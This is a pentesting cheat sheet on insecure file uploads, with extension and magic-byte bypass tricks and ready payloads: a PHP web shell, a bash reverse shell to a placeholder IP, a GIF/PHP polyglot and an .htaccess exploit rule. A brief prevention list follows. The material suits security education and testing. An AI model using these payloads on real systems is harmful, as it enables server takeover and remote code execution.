### **What is Insecure File Uploads ?** 
- **Uploading malicious files** to a server
- **Impact**: Web shell, RCE, malware distribution
- **Common**: File upload features without proper validation
##### **How it works :** 

```
1. Website allows file upload (profile pic, documents)
2. Attacker uploads malicious file (PHP shell, .exe, etc.)
3. Server stores/executes it
4. Attacker accesses file → Gets shell access
```

## **Simple Methodology:**

### **1. Test File Types**

```
Try uploading:

1. shell.php
2. shell.php.jpg (double extension)
3. shell.pHp (case variation)
4. shell.php%00.jpg (null byte)
5. .htaccess (modify server config)
```
### **2. Bypass Techniques:**

```
A. Extension Bypass:
- shell.php → shell.php.jpg (if checks extension only)
- shell.php%00.jpg → becomes shell.php (null byte)
- shell.pHp → case insensitive server

B. Content-Type Bypass:
Change Content-Type: image/jpeg

C. Magic Bytes:
Add GIF89a; at start of PHP file
```
### **3. Test Execution**

```
1. Upload file
2. Find where it's stored
3. Access it via browser
4. If PHP executes → SHELL!
```
## **Essential Payloads:**

### **1. PHP Web Shell:**

```php
<?php system($_GET['cmd']); ?>
```
### **2. PHP Reverse Shell:**

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"); ?>
```
### **3. Image + PHP (Polyglot):**

```php
GIF89a; <?php system($_GET['cmd']); ?>
```

### **4. .htaccess Attack:**

```
AddType application/x-httpd-php .jpg
# Makes .jpg files execute as PHP
```
## **Quick Test Flow:**

```
1. Upload test.txt → Check if allowed
2. Upload shell.php → If blocked, try bypasses
3. Upload shell.php.jpg → Double extension
4. Upload with GIF header → Magic bytes
5. If uploaded, access it: http://site.com/uploads/shell.php?cmd=id
```
## **Impact:**

- **File upload + execution = Remote Code Execution**
- **Web shell = Full server control**
- **Malware hosting = Attack other users**
## **Prevention:**

```
1. Whitelist allowed extensions
2. Verify file content (magic bytes)
3. Store outside web root
4. Rename uploaded files
5. Use proper permissions
```

- **File upload vulns often lead to instant RCE - always test upload features thoroughly!**